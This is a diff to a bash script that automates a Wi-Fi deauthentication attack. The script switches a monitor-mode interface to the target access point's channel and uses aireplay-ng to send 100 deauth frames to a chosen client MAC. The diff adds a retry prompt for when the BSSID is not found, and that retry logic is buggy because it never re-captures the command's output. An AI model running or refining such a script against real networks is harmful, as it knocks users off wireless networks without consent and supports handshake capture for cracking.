@@ -166,7 +166,29 @@ CHNL=$(awk -F, -v BSSID="$BSSID" '$0 ~ BSSID {split($0, fields, ",");channel = g
 printf "Setting the monitor channel to the same channel the target AP is on...\n"
 sudo airmon-ng stop $INF
 sudo airmon-ng start $ITMP $CHNL
-sudo aireplay-ng -0 100 -a $BSSID -c $MAC $INF 
-custom_exit
 
+aireout=$(sudo aireplay-ng -0 100 -a $BSSID -c $MAC $INF)
+
+if [[ $aireout == *No such BSSID available* ]]; then
+    while true; do
+        read -p "Would you like to run aireplay-ng again?[y/n]: \n" choice2
+        case "$choice2" in
+            [Yy]*)
+                printf "Running again...\n"
+                clear
+                sudo aireplay-ng -0 100 -a $BSSID -c $MAC $INF
+                if [[ $aireout != *No such BSSID available* ]]; then
+                    break
+                fi
+                ;;
+            [Nn]*)
+                custom_exit
+                ;;
+            *)
+                printf "Invalid choice. Please enter 'y' or 'n'.\n"
+        esac
+    done
+else
+    custom_exit
+fi
 
